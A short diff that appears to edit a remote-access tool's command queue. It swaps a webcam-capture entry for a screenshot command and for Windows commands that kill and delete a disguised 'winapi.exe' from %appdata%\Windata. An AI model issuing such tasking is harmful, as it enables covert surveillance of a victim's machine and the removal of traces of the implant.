@@ -1,1 +1,4 @@
-campic||162
+exec|taskkill /IM winapi.exe|163
+exec|del %appdata%\Windata\winapi.exe|164
+exec|rmdir %appdata%\Windata|165
+screenshot||166
